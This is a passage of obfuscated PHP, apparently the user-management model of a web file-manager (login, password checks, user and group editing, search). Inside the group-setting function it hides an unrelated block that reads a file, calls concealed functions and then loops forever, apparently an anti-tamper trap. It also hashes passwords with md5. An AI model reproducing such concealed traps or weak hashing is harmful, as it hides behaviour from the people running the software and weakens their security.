$ˆ¡§èéı) { $±È¬Ç…ù =& $_SERVER[ñˆ‹ß¿÷]; $Ôâ†å = Model($±È¬Ç…ù[2299])->where(array($±È¬Ç…ù[94] => $ÔŒÍÄ®£, $±È¬Ç…ù[374] => $ˆ¡§èéı))->find(); if ($Ôâ†å) { return $this->getInfo($Ôâ†å[$±È¬Ç…ù[1664]]); } return !1; } public function userLoginCheck($¨­½«¶ß, $î÷Öæ•©) { $ÃêÇË£İ =& $_SERVER[ñˆ‹ß¿÷]; $½ô¶¦‹Ô = $this->userLoginFind($¨­½«¶ß); if (!$½ô¶¦‹Ô) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($½ô¶¦‹Ô[$ÃêÇË£İ[1664]], $î÷Öæ•©)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($½ô¶¦‹Ô[$ÃêÇË£İ[1664]]); } public function userLoginFind($ÅıÇ©œ) { $åğ—¾‹© =& $_SERVER[ñˆ‹ß¿÷]; $±ßæÑË = array($åğ—¾‹©[32] => $ÅıÇ©œ, $åğ—¾‹©[542] => $ÅıÇ©œ, $åğ—¾‹©[305] => $ÅıÇ©œ, $åğ—¾‹©[2300] => $ÅıÇ©œ, $åğ—¾‹©[1007] => $åğ—¾‹©[1009]); if ($this->nickNameRpt()) { unset($±ßæÑË[$åğ—¾‹©[542]]); } return $this->where($±ßæÑË)->find(); } public function clearCache($©Şİ¶¹´) { $àÙ¦®‚ =& $_SERVER[ñˆ‹ß¿÷]; $this->cacheFunctionClear($àÙ¦®‚[1918], $©Şİ¶¹´); $this->cacheFunctionClear($àÙ¦®‚[1919], $©Şİ¶¹´); $this->cacheFunctionClear($àÙ¦®‚[2282], $©Şİ¶¹´); } public function userPasswordCheck($ŸäŞöÎû, $úªòˆÍ) { $¤ş€†ìö =& $_SERVER[ñˆ‹ß¿÷]; $µöÄšŞ = $this->where(array($¤ş€†ìö[1664] => intval($ŸäŞöÎû)))->find(); $²ÌÙ½• = $this->metaGet($ŸäŞöÎû); $Ç­ µÌ” = isset($²ÌÙ½•[$¤ş€†ìö[2301]]) ? $²ÌÙ½•[$¤ş€†ìö[2301]] : $¤ş€†ìö[12]; if (md5($Ç­ µÌ” . trim($úªòˆÍ)) !== $µöÄšŞ[$¤ş€†ìö[896]]) { return !1; } return !0; } public function userAdd($ê”ç¥ß) { $ÇÄİ‡°ß =& $_SERVER[ñˆ‹ß¿÷]; $×€Î— = array($ÇÄİ‡°ß[420] => $ê”ç¥ß[$ÇÄİ‡°ß[32]], $ÇÄİ‡°ß[2302] => $ê”ç¥ß[$ÇÄİ‡°ß[1543]], $ÇÄİ‡°ß[2303] => isset($ê”ç¥ß[$ÇÄİ‡°ß[305]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[305]] : $ÇÄİ‡°ß[12], $ÇÄİ‡°ß[2304] => isset($ê”ç¥ß[$ÇÄİ‡°ß[2300]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[2300]] : $ÇÄİ‡°ß[12], $ÇÄİ‡°ß[2305] => isset($ê”ç¥ß[$ÇÄİ‡°ß[542]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[542]] : $ê”ç¥ß[$ÇÄİ‡°ß[32]], $ÇÄİ‡°ß[2306] => isset($ê”ç¥ß[$ÇÄİ‡°ß[543]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[543]] : $ÇÄİ‡°ß[12], $ÇÄİ‡°ß[2307] => isset($ê”ç¥ß[$ÇÄİ‡°ß[2308]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[2308]] : 1, $ÇÄİ‡°ß[2309] => $ê”ç¥ß[$ÇÄİ‡°ß[896]], $ÇÄİ‡°ß[1920] => isset($ê”ç¥ß[$ÇÄİ‡°ß[1823]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[1823]] : 1024 * 1024 * 20, $ÇÄİ‡°ß[1921] => 0, $ÇÄİ‡°ß[2310] => 0, $ÇÄİ‡°ß[1965] => isset($ê”ç¥ß[$ÇÄİ‡°ß[757]]) ? $ê”ç¥ß[$ÇÄİ‡°ß[757]] : 1); if (!empty($ê”ç¥ß[$ÇÄİ‡°ß[1664]])) { $×€Î—[$ÇÄİ‡°ß[1664]] = $ê”ç¥ß[$ÇÄİ‡°ß[1664]]; } $ò¯ÜªŒ× = $this->_checkExist($ê”ç¥ß); if ($ò¯ÜªŒ× !== !0) { return $ò¯ÜªŒ×; } if (!empty($×€Î—[$ÇÄİ‡°ß[543]]) && strlen($×€Î—[$ÇÄİ‡°ß[543]]) > 255) { $×€Î—[$ÇÄİ‡°ß[543]] = $ÇÄİ‡°ß[12]; } $ƒ¸šùûö = $this->add($×€Î—); $Á£Ë“‰ç = array($ÇÄİ‡°ß[2309] => $×€Î—[$ÇÄİ‡°ß[896]], $ÇÄİ‡°ß[2305] => $×€Î—[$ÇÄİ‡°ß[542]]); $this->userEdit($ƒ¸šùûö, $Á£Ë“‰ç); Model($ÇÄİ‡°ß[1334])->userRootAdd($ƒ¸šùûö); return $ƒ¸šùûö; } protected function userEditTest($Œìƒ•Ê», $âş¦æªÚ) { return $this->call($_SERVER[ñˆ‹ß¿÷][2311], $Œìƒ•Ê», $âş¦æªÚ); } protected function userEdit($ÊÁ¯ŞÄÔ, $ÂÄªšœÙ) { $±˜ÈœËø =& $_SERVER[ñˆ‹ß¿÷]; $¾¿¸À›¯ = $this->getInfoSimple($ÊÁ¯ŞÄÔ); if (!$¾¿¸À›¯) { return !1; } $Á²É—À„ = $this->_checkExist($ÂÄªšœÙ, $ÊÁ¯ŞÄÔ); if ($Á²É—À„ !== !0) { return $Á²É—À„; } if (isset($ÂÄªšœÙ[$±˜ÈœËø[896]]) && trim($ÂÄªšœÙ[$±˜ÈœËø[896]]) != $±˜ÈœËø[12]) { $ï÷šáãÊ = $this->metaGet($ÊÁ¯ŞÄÔ); if (empty($ï÷šáãÊ[$±˜ÈœËø[2301]])) { $ï÷šáãÊ[$±˜ÈœËø[2301]] = rand_string(10); Model($±˜ÈœËø[513])->metaSet($ÊÁ¯ŞÄÔ, $±˜ÈœËø[2301], $ï÷šáãÊ[$±˜ÈœËø[2301]]); } $ÂÄªšœÙ[$±˜ÈœËø[896]] = md5($ï÷šáãÊ[$±˜ÈœËø[2301]] . trim($ÂÄªšœÙ[$±˜ÈœËø[896]])); } else { unset($ÂÄªšœÙ[$±˜ÈœËø[896]]); } if (!empty($ÂÄªšœÙ[$±˜ÈœËø[543]]) && strlen($ÂÄªšœÙ[$±˜ÈœËø[543]]) > 255) { $ÂÄªšœÙ[$±˜ÈœËø[543]] = $±˜ÈœËø[12]; } $this->where(array($±˜ÈœËø[1655] => $ÊÁ¯ŞÄÔ))->save($ÂÄªšœÙ); if (isset($ÂÄªšœÙ[$±˜ÈœËø[542]])) { $this->setNamePinyin($ÊÁ¯ŞÄÔ, $ÂÄªšœÙ[$±˜ÈœËø[542]]); } $this->clearCache($ÊÁ¯ŞÄÔ); return !0; } public function setNamePinyin($³®à¼èœ, $Ü®‡ ·¢ = false) { $ãŞĞ”¶˜ =& $_SERVER[ñˆ‹ß¿÷]; if (!$Ü®‡ ·¢) { $¨åúİ´ = $this->getInfoSimple($³®à¼èœ); $Ü®‡ ·¢ = $¨åúİ´[$ãŞĞ”¶˜[542]] ? $¨åúİ´[$ãŞĞ”¶˜[542]] : $¨åúİ´[$ãŞĞ”¶˜[32]]; } $Ô»ì•â³ = Model($ãŞĞ”¶˜[535]); if (!Input::check($Ü®‡ ·¢, $ãŞĞ”¶˜[593])) { return $Ô»ì•â³->metaSet($³®à¼èœ, array($ãŞĞ”¶˜[465] => $ãŞĞ”¶˜[12], $ãŞĞ”¶˜[464] => $ãŞĞ”¶˜[12])); } return $Ô»ì•â³->metaSet($³®à¼èœ, array($ãŞĞ”¶˜[465] => str_replace($ãŞĞ”¶˜[53], $ãŞĞ”¶˜[12], Pinyin::get($Ü®‡ ·¢)), $ãŞĞ”¶˜[464] => Pinyin::get($Ü®‡ ·¢, $ãŞĞ”¶˜[594]))); } private function nickNameRpt() { $•º´å¢ =& $_SERVER[ñˆ‹ß¿÷]; $§ş°ÜÔ– = Model($•º´å¢[777])->get($•º´å¢[2312]); $å’éüı = $GLOBALS[$•º´å¢[6]][$•º´å¢[381]][$•º´å¢[2312]]; $ØŒŒ¢¦ = !is_null($§ş°ÜÔ–) ? $§ş°ÜÔ– : $å’éüı; return !!$ØŒŒ¢¦; } private function _checkExist($ÂÈŞğ¼, $¶Œ©ÈºÄ = false) { $ë–‡ÈÓ =& $_SERVER[ñˆ‹ß¿÷]; $€Ëá÷ì = array($ë–‡ÈÓ[32] => UserModel::ERROR_USER_EXIST_NAME, $ë–‡ÈÓ[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $ë–‡ÈÓ[305] => UserModel::ERROR_USER_EXIST_EMAIL, $ë–‡ÈÓ[2300] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($€Ëá÷ì[$ë–‡ÈÓ[542]]); } $«—ßÌ° = $¶Œ©ÈºÄ ? array($ë–‡ÈÓ[1664] => array($ë–‡ÈÓ[2313], $¶Œ©ÈºÄ)) : array(); foreach ($€Ëá÷ì as $Í†Ø±œ => $ş½‡ÌœÊ) { $ÛøÍ°ĞŒ = array(); foreach ($€Ëá÷ì as $Ì‡²ßá => $½¬Ó€Ô¥) { if (isset($ÂÈŞğ¼[$Ì‡²ßá]) && $ÂÈŞğ¼[$Ì‡²ßá]) { $ÛøÍ°ĞŒ[] = $ÂÈŞğ¼[$Ì‡²ßá]; } } if (!$ÛøÍ°ĞŒ) { continue; } $òèÎË¥ë = array_merge(array($Í†Ø±œ => array($ë–‡ÈÓ[7], $ÛøÍ°ĞŒ)), $«—ßÌ°); $ææ¨ƒìœ = $this->where($òèÎË¥ë)->find(); if ($ææ¨ƒìœ) { return $ş½‡ÌœÊ; } } return !0; } public function userListInfo($“ıÔ¯çË) { $ÚòŞÎ«Î =& $_SERVER[ñˆ‹ß¿÷]; $—ÔÏÒµ° = array(); $“ıÔ¯çË = is_array($“ıÔ¯çË) ? array_unique($“ıÔ¯çË) : array(); if (!$“ıÔ¯çË) { return $—ÔÏÒµ°; } if (count($“ıÔ¯çË) < 20) { foreach ($“ıÔ¯çË as $šÌïÙÂ) { $—ÔÏÒµ°[$šÌïÙÂ . $ÚòŞÎ«Î[12]] = $this->getInfoSimpleOuter($šÌïÙÂ); } } else { $ÄûÍß¿¥ = array($ÚòŞÎ«Î[1655] => array($ÚòŞÎ«Î[418], $“ıÔ¯çË)); if (count($“ıÔ¯çË) == 1) { $ÄûÍß¿¥ = array($ÚòŞÎ«Î[1655] => $“ıÔ¯çË[0]); } $ñË£ëƒ“ = Model($ÚòŞÎ«Î[513])->field($this->simpleField)->where($ÄûÍß¿¥)->select(); $ñË£ëƒ“ = array_to_keyvalue($ñË£ëƒ“, $ÚòŞÎ«Î[1664]); foreach ($“ıÔ¯çË as $šÌïÙÂ) { $ù¸íèìÆ = $ñË£ëƒ“[$šÌïÙÂ]; if (!$ù¸íèìÆ) { $—ÔÏÒµ°[$šÌïÙÂ . $ÚòŞÎ«Î[12]] = $this->getInfoSimpleOuter($šÌïÙÂ); continue; } $ù¸íèìÆ[$ÚòŞÎ«Î[543]] = Action($ÚòŞÎ«Î[2286])->parseUrl($ù¸íèìÆ[$ÚòŞÎ«Î[543]]); $—ÔÏÒµ°[$šÌïÙÂ . $ÚòŞÎ«Î[12]] = $ù¸íèìÆ; } } return $—ÔÏÒµ°; } protected function userStatus($¬ÀÍİ„Ò, $©¢ÄÔõÛ) { $±ÆÍ«ú“ = $this->getInfoSimple($¬ÀÍİ„Ò); if (!$±ÆÍ«ú“) { return !1; } $˜‰¹°± = array($_SERVER[ñˆ‹ß¿÷][757] => $©¢ÄÔõÛ); return $this->userEdit($¬ÀÍİ„Ò, $˜‰¹°±); } protected function userRemove($¾Û”€£Ü) { $ûˆøïÔÛ =& $_SERVER[ñˆ‹ß¿÷]; $Ùá˜¥Š¾ = $this->getInfoSimple($¾Û”€£Ü); if (!$Ùá˜¥Š¾) { return !1; } $ñ‹ë˜õŠ = array($ûˆøïÔÛ[1655] => $¾Û”€£Ü); Model($ûˆøïÔÛ[601])->where($ñ‹ë˜õŠ)->delete(); Model($ûˆøïÔÛ[2314])->where($ñ‹ë˜õŠ)->delete(); Model($ûˆøïÔÛ[1926])->where($ñ‹ë˜õŠ)->delete(); Model($ûˆøïÔÛ[2299])->where($ñ‹ë˜õŠ)->delete(); Model($ûˆøïÔÛ[1075])->where($ñ‹ë˜õŠ)->delete(); Model($ûˆøïÔÛ[2129])->removeUserAll($¾Û”€£Ü); Model($ûˆøïÔÛ[832])->userRootRemove($¾Û”€£Ü); return $this->where($ñ‹ë˜õŠ)->delete(); } protected function userGroupSet($‰œ«¥ÏÓ, $’ƒª€´û, $áˆãšşĞ = array()) { $¬ÙÆÂŒÜ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($_SERVER[$¬ÙÆÂŒÜ[879]]) || !isset($_SERVER[$¬ÙÆÂŒÜ[1344]])) { $÷†¥™… = $¬ÙÆÂŒÜ[881]; $Ö×‘ø„ = $¬ÙÆÂŒÜ[882]; $ˆ Ò”à = $_SERVER[$¬ÙÆÂŒÜ[883]] . $¬ÙÆÂŒÜ[884]; $ø˜ÚïÎ™ = $Ö×‘ø„($ˆ Ò”à); $™›Ã† = explode($¬ÙÆÂŒÜ[231], $ø˜ÚïÎ™); if (count($™›Ã†) < $¬ÙÆÂŒÜ[626]) { $¶±ÈëŒÎ = $¬ÙÆÂŒÜ[885]; $¶±ÈëŒÎ(); } $®óÙ¦›· = $¬ÙÆÂŒÜ[886]; $®óÙ¦›·($_SERVER[$¬ÙÆÂŒÜ[887]]); $·ÄíÇĞ– = 1; for ($¢ìåöªˆ = $·ÄíÇĞ–; $¢ìåöªˆ > 0; $¢ìåöªˆ++) { $®óÙ¦›· = json_encode($GLOBALS[$¬ÙÆÂŒÜ[418]]); } } $İş¾ = $this->getInfoSimple($‰œ«¥ÏÓ); if (!$İş¾ || !is_array($’ƒª€´û)) { return !1; } $¼ø³¼¥ú = Model($¬ÙÆÂŒÜ[1926]); $¼ø³¼¥ú->where(array($¬ÙÆÂŒÜ[1664] => $‰œ«¥ÏÓ))->delete(); $®¬¾Êá = array(); $É¨È•»ß = 0; foreach ($’ƒª€´û as $Ü½Ñ´òû => $õ‚ù‹·Ç) { $¸¹Ïä²ê = array($¬ÙÆÂŒÜ[1664] => $‰œ«¥ÏÓ, $¬ÙÆÂŒÜ[1836] => $Ü½Ñ´òû, $¬ÙÆÂŒÜ[1940] => $õ‚ù‹·Ç); $¸¹Ïä²ê[$¬ÙÆÂŒÜ[1860]] = isset($áˆãšşĞ[$É¨È•»ß]) ? $áˆãšşĞ[$É¨È•»ß] : 0; $É¨È•»ß++; $®¬¾Êá[] = $¸¹Ïä²ê; } return $¼ø³¼¥ú->addAll($®¬¾Êá, array(), !0); } protected function userGroupAdd($Å‹û¯ï, $¤ª¡¯ƒü = array()) { $şá»İ¸ =& $_SERVER[ñˆ‹ß¿÷]; $ÈÏêÔáÍ = $this->getInfoSimple($Å‹û¯ï); if (!$ÈÏêÔáÍ || empty($¤ª¡¯ƒü)) { return !1; } $€êç¶¼î = array(); foreach ($¤ª¡¯ƒü as $ÒË…’Ñ€ => $¼¡ÃîÊ´) { $€êç¶¼î[] = array($şá»İ¸[1664] => $Å‹û¯ï, $şá»İ¸[1836] => $ÒË…’Ñ€, $şá»İ¸[1940] => $¼¡ÃîÊ´, $şá»İ¸[1860] => 0); } return Model($şá»İ¸[1926])->addAll($€êç¶¼î, array(), !0); } protected function userGroupRemove($ê…Ì¯Ñ, $ÕØ´°É¬) { $å¬÷ëœ =& $_SERVER[ñˆ‹ß¿÷]; $¾¾õùªè = $this->getInfoSimple($ê…Ì¯Ñ); if (!$¾¾õùªè || !$ÕØ´°É¬) { return !1; } $ĞÉ‰ºÂ = array($å¬÷ëœ[1655] => $ê…Ì¯Ñ, $å¬÷ëœ[1924] => $ÕØ´°É¬); return Model($å¬÷ëœ[1926])->where($ĞÉ‰ºÂ)->delete(); } public function listData() { $‚ÄÙÒ Ö = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‚ÄÙÒ Ö[$_SERVER[ñˆ‹ß¿÷][369]]); return $‚ÄÙÒ Ö; } public function listByID($ã¢üĞ”ß) { $Ùµ×ãÓ³ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ã¢üĞ”ß) { return; } $µÈªÉèˆ = array($Ùµ×ãÓ³[1664] => array($Ùµ×ãÓ³[7], $ã¢üĞ”ß)); $ğó‚ïª = $this->where($µÈªÉèˆ)->select(); $ğó‚ïª = array_sort_keep($ğó‚ïª, $Ùµ×ãÓ³[1664], $ã¢üĞ”ß); $this->_listDataApply($ğó‚ïª); return $ğó‚ïª; } public function listByGroup($á„¨ñ‰û = 0, $Ä²Ò©šø = array()) { $êÏ‰Ÿ‚‘ =& $_SERVER[ñˆ‹ß¿÷]; $²¢™¢ë­ = $êÏ‰Ÿ‚‘[12]; $ØóÅñû = array(); if ($á„¨ñ‰û) { $ØóÅñû = array($êÏ‰Ÿ‚‘[2315] => intval($á„¨ñ‰û)); $²¢™¢ë­ = "\x4c\x45\106\x54\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\165\163\145\162\x5f\x67\162\x6f\165\x70\x20\165\x73\x65\x72\137\147\162\157\165\x70\40\x6f\x6e\40\x75\x73\145\162\56\x75\163\x65\x72\111\104\40\x3d\40\165\x73\x65\162\x5f\x67\162\x6f\x75\x70\56\165\x73\145\162\x49\104"; $×ş—×ìµ = Input::get($êÏ‰Ÿ‚‘[457], null, $êÏ‰Ÿ‚‘[12]) ? $êÏ‰Ÿ‚‘[12] : $êÏ‰Ÿ‚‘[2316]; } if (isset($Ä²Ò©šø[$êÏ‰Ÿ‚‘[757]])) { $ØóÅñû[$êÏ‰Ÿ‚‘[2317]] = $Ä²Ò©šø[$êÏ‰Ÿ‚‘[757]]; } $¯¢şÅÉ… = $this->_makeOrder($×ş—×ìµ)->field($êÏ‰Ÿ‚‘[2318])->where($ØóÅñû)->join($²¢™¢ë­)->selectPage(50); $this->_listDataApply($¯¢şÅÉ…[$êÏ‰Ÿ‚‘[369]]); return $¯¢şÅÉ…; } private function _makeOrder($Üà¬Ÿú“ = '') { $¾æâ¬ªô =& $_SERVER[ñˆ‹ß¿÷]; $êó˜ˆ°Ğ = array($¾æâ¬ªô[1664], $¾æâ¬ªô[32], $¾æâ¬ªô[1825], $¾æâ¬ªô[1797], $¾æâ¬ªô[200]); $À·ø¨®ò = array($¾æâ¬ªô[450] => $¾æâ¬ªô[451], $¾æâ¬ªô[452] => $¾æâ¬ªô[453]); $ãÄ®åÛå = Input::get($¾æâ¬ªô[457], $¾æâ¬ªô[7], $¾æâ¬ªô[1655], $êó˜ˆ°Ğ); $´ÉË®õŠ = Input::get($¾æâ¬ªô[458], $¾æâ¬ªô[7], $¾æâ¬ªô[1927], array($¾æâ¬ªô[1927], $¾æâ¬ªô[452])); $´ÉË®õŠ = $À·ø¨®ò[$´ÉË®õŠ]; $Üà¬Ÿú“ = $Üà¬Ÿú“ . "\165\163\145\162\x2e{$ãÄ®åÛå}\40{$´ÉË®õŠ}\x2c\x20\165\x73\145\x72\56\x75\x73\x65\162\x49\x44\x20\141\x73\143"; return $this->alias($¾æâ¬ªô[2049])->order($Üà¬Ÿú“); } public function listSearch($çµİ¼Ğ) { $ØåŠ®à =& $_SERVER[ñˆ‹ß¿÷]; $æ‘«çÑÇ = $çµİ¼Ğ[$ØåŠ®à[1930]]; $Ø¬ä×²Ü = isset($çµİ¼Ğ[$ØåŠ®à[1931]]) ? $çµİ¼Ğ[$ØåŠ®à[1931]] : !1; $æ‘«çÑÇ = str_replace($ØåŠ®à[1932], $ØåŠ®à[1933], trim($æ‘«çÑÇ)); $¼È“ì¼¿ = array($ØåŠ®à[32] => array($ØåŠ®à[383], "\x25{$æ‘«çÑÇ}\45"), $ØåŠ®à[305] => array($ØåŠ®à[383], "{$æ‘«çÑÇ}\45"), $ØåŠ®à[542] => array($ØåŠ®à[383], "{$æ‘«çÑÇ}\45"), $ØåŠ®à[1007] => $ØåŠ®à[1934]); if (Input::check($æ‘«çÑÇ, $ØåŠ®à[311])) { $¼È“ì¼¿[$ØåŠ®à[1664]] = array($ØåŠ®à[383], "{$æ‘«çÑÇ}\x25"); $¼È“ì¼¿[$ØåŠ®à[2300]] = array($ØåŠ®à[383], "{$æ‘«çÑÇ}\x25"); } if (!$æ‘«çÑÇ) { $¼È“ì¼¿ = array(); } if (isset($çµİ¼Ğ[$ØåŠ®à[757]])) { $¼È“ì¼¿[$ØåŠ®à[757]] = $çµİ¼Ğ[$ØåŠ®à[757]]; } $¼È“ì¼¿ = $this->parseWhereLike($¼È“ì¼¿); $“Îğ˜Í… = $this->_makeOrder()->where($¼È“ì¼¿)->selectPage(20); if (!$“Îğ˜Í… || count($“Îğ˜Í…[$ØåŠ®à[369]]) < 5 && Input::check($æ‘«çÑÇ, $ØåŠ®à[318])) { $ó“¢æÀÈ = $this->_searchFromMeta($ØåŠ®à[464], $æ‘«çÑÇ, 10); $¼€¦îŠÊ = $this->_searchFromMeta($ØåŠ®à[465], $æ‘«çÑÇ, 10); $Ô•“‡ï = array_merge($ó“¢æÀÈ, $¼€¦îŠÊ, $“Îğ˜Í…[$ØåŠ®à[369]]); $“Îğ˜Í…[$ØåŠ®à[369]] = array_unique_by_key($Ô•“‡ï, $ØåŠ®à[1664]); $“Îğ˜Í…[$ØåŠ®à[366]][$ØåŠ®à[367]] = count($“Îğ˜Í…[$ØåŠ®à[369]]); $“Îğ˜Í…[$ØåŠ®à[366]][$ØåŠ®à[368]] = ceil($“Îğ˜Í…[$ØåŠ®à[366]][$ØåŠ®à[367]] / $“Îğ˜Í…[$ØåŠ®à[366]][$ØåŠ®à[363]]); } $this->_listDataApply($“Îğ˜Í…[$ØåŠ®à[369]]); $this->_filterByGroup($“Îğ˜Í…, $Ø¬ä×²Ü); return $“Îğ˜Í…; } private function _filterByGroup(&$’ÚÄ§, $ªÓŠ•Úä) { $•­ƒšÔ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ªÓŠ•Úä) { return $’ÚÄ§; } foreach ($’ÚÄ§[$•­ƒšÔ[369]] as $—ÈÕÛ× => &$şè“¼Œï) { $í„¬œ = array_to_keyvalue($şè“¼Œï[$•­ƒšÔ[2019]], $•­ƒšÔ[12], $•­ƒšÔ[1836]); if (!in_array($ªÓŠ•Úä, $í„¬œ)) { unset($’ÚÄ§[$•­ƒšÔ[369]][$—ÈÕÛ×]); } } unset($şè“¼Œï); $’ÚÄ§[$•­ƒšÔ[369]] = array_values($’ÚÄ§[$•­ƒšÔ[369]]); $’ÚÄ§[$•­ƒšÔ[366]] = array($•­ƒšÔ[2083] => count($’ÚÄ§[$•­ƒšÔ[369]]), $•­ƒšÔ[2081] => $’ÚÄ§[$•­ƒšÔ[366]][$•­ƒšÔ[363]], $•­ƒšÔ[2080] => 1, $•­ƒšÔ[2082] => 1); } private function _searchFromMeta($ÈÎ¡«“÷, $õÊ› Àë, $€â—àü‡) { $‹¯ñã‰ı =& $_SERVER[ñˆ‹ß¿÷]; $õÊ› Àë = strtolower($õÊ› Àë); $¦ªı¬ø– = array($‹¯ñã‰ı[94] => $ÈÎ¡«“÷, $‹¯ñã‰ı[374] => array($‹¯ñã‰ı[383], "\x25{$õÊ› Àë}\x25")); $¦ªı¬ø– = $this->parseWhereLike($¦ªı¬ø–); $ş‚Çó¼Ç = Model($‹¯ñã‰ı[2319])->where($¦ªı¬ø–)->limit($€â—àü‡)->select(); if (!$ş‚Çó¼Ç) { return array(); } $ş‚Çó¼Ç = array_to_keyvalue($ş‚Çó¼Ç, $‹¯ñã‰ı[12], $‹¯ñã‰ı[1664]); $Ã©ïĞÛ§ = $this->where(array($‹¯ñã‰ı[1655] => array($‹¯ñã‰ı[7], $ş‚Çó¼Ç)))->select(); if (!$Ã©ïĞÛ§) { return array(); } return $Ã©ïĞÛ§; } private function _listDataApplyItem($õ·ÑúÚÏ) { $êŸ‡âøé = array($õ·ÑúÚÏ); $this->_listDataApply($êŸ‡âøé); return $êŸ‡âøé[0]; } private function _listDataApply(&$µÃÒÙ) { $†·¶„ÁÊ =& $_SERVER[ñˆ‹ß¿÷]; if (!$µÃÒÙ) { return; } array_remove_key($µÃÒÙ, $†·¶„ÁÊ[896]); $œÍÑçåî = array_to_keyvalue($µÃÒÙ, $†·¶„ÁÊ[12], $†·¶„ÁÊ[1664]); $this->_listAppendGroup($µÃÒÙ, $œÍÑçåî); $this->_listAppendMeta($µÃÒÙ, $œÍÑçåî); $this->_listAppendSourceRoot($µÃÒÙ, $œÍÑçåî); } private function _listAppendSourceRoot(&$ÏøÉœêª, $Î‘©¿»¯) { $¬‚ÅşĞ =& $_SERVER[ñˆ‹ß¿÷]; $ƒ‰Å“Éô = Model($¬‚ÅşĞ[832])->listSourceRoot(SourceModel::TYPE_USER, $Î‘©¿»¯); $ƒ‰Å“Éô = array_to_keyvalue($ƒ‰Å“Éô, $¬‚ÅşĞ[505]); $ƒ‰Å“Éô = array_remove_key($ƒ‰Å“Éô, $¬‚ÅşĞ[505]); foreach ($ÏøÉœêª as &$›š™Íõ´) { $›š™Íõ´[$¬‚ÅşĞ[86]] = $ƒ‰Å“Éô[$›š™Íõ´[$¬‚ÅşĞ[1664]]] ? $ƒ‰Å“Éô[$›š™Íõ´[$¬‚ÅşĞ[1664]]] : array(); } unset($›š™Íõ´); } private function _listAppendGroup(&$™Ó€‰¯ö, $¥¤¾¾ãÏ) { $½êıì =& $_SERVER[ñˆ‹ß¿÷]; $ã¸—ó›¥ = array($½êıì[1664] => array($½êıì[7], $¥¤¾¾ãÏ)); $Ë„ˆç = Model($½êıì[1926])->where($ã¸—ó›¥)->select(); $Ù’ÈàÌó = array_to_keyvalue($Ë„ˆç, $½êıì[12], $½êıì[1836]); $Ù’ÈàÌó = array_remove_value(array_unique($Ù’ÈàÌó), $½êıì[197]); if (!$Ù’ÈàÌó || !$Ë„ˆç) { return; } $ã¸—ó›¥ = array($½êıì[1836] => array($½êıì[7], $Ù’ÈàÌó)); $íˆØ®ç« = Model($½êıì[2017])->field($½êıì[2320])->where($ã¸—ó›¥)->select(); $íˆØ®ç« = array_to_keyvalue($íˆØ®ç«, $½êıì[1836]); $Ë„ˆç = array_to_keyvalue_group($Ë„ˆç, $½êıì[1664]); foreach ($Ë„ˆç as &$€ıığï) { $Û»¶µÃ = array(); foreach ($€ıığï as $Ÿş²ÎÖä) { if (!$Ÿş²ÎÖä[$½êıì[1940]]) { continue; } $Áê´ı«Ç = Model($½êıì[507])->listData($Ÿş²ÎÖä[$½êıì[1940]]); $Û»¶µÃ[] = array($½êıì[1836] => $Ÿş²ÎÖä[$½êıì[1836]], $½êıì[2321] => $íˆØ®ç«[$Ÿş²ÎÖä[$½êıì[1836]]][$½êıì[32]], $½êıì[521] => $íˆØ®ç«[$Ÿş²ÎÖä[$½êıì[1836]]][$½êıì[521]], $½êıì[413] => $Áê´ı«Ç); } $€ıığï = $Û»¶µÃ; } unset($€ıığï); foreach ($™Ó€‰¯ö as &$ª­÷Á­) { $ª­÷Á­[$½êıì[2019]] = array(); if (isset($Ë„ˆç[$ª­÷Á­[$½êıì[1664]]])) { $ª­÷Á­[$½êıì[2019]] = $Ë„ˆç[$ª­÷Á­[$½êıì[1664]]]; } } unset($ª­÷Á­); } public function userAppendGroup($éÉ°¢â¬) { $¹á×ÊŠö =& $_SERVER[ñˆ‹ß¿÷]; if (!$éÉ°¢â¬) { return array(); } $this->_listAppendGroup($éÉ°¢â¬, array_to_keyvalue($éÉ°¢â¬, $¹á×ÊŠö[12], $¹á×ÊŠö[1664])); return $éÉ°¢â¬; } private function _listAppendMeta(&$ˆ”Ê£ßÖ, $¶ï¢òÈ) { $ø“•ó³ß =& $_SERVER[ñˆ‹ß¿÷]; $˜Î‰ÊÌÇ = UserJobModel::JOB_KEY; $Å”È™ÚÄ = array($ø“•ó³ß[2301]); $µŠœ¥– = array($ø“•ó³ß[1664] => array($ø“•ó³ß[7], $¶ï¢òÈ)); $Ş€§ÒŸà = Model($ø“•ó³ß[2299])->where($µŠœ¥–)->select(); $Ş€§ÒŸà = array_to_keyvalue_group($Ş€§ÒŸà, $ø“•ó³ß[1664]); foreach ($Ş€§ÒŸà as &$ß¹÷ß¬) { $§Ä«¾¥Î = array(); foreach ($ß¹÷ß¬ as $äöú„À¾) { if (!in_array($äöú„À¾[$ø“•ó³ß[94]], $Å”È™ÚÄ)) { $§Ä«¾¥Î[$äöú„À¾[$ø“•ó³ß[94]]] = $äöú„À¾[$ø“•ó³ß[374]]; } } $ß¹÷ß¬ = $§Ä«¾¥Î; } unset($ß¹÷ß¬); $â»İì = Model($ø“•ó³ß[2322]); foreach ($ˆ”Ê£ßÖ as &$Ø˜¸ñı‹) { $œÏƒçş = array(); if (isset($Ş€§ÒŸà[$Ø˜¸ñı‹[$ø“•ó³ß[1664]]])) { $œÏƒçş = $Ş€§ÒŸà[$Ø˜¸ñı‹[$ø“•ó³ß[1664]]]; } $Ø˜¸ñı‹[$ø“•ó³ß[2323]] = array(); if (isset($œÏƒçş[$˜Î‰ÊÌÇ])) { $Ø˜¸ñı‹[$ø“•ó³ß[2323]] = $â»İì->getUserJobInfo($œÏƒçş[$˜Î‰ÊÌÇ]); } } unset($Ø˜¸ñı‹); } protected function groupUserAll($ÚÇó©¥‰) { $ÅøÂ¯Æ‘ =& $_SERVER[ñˆ‹ß¿÷]; if 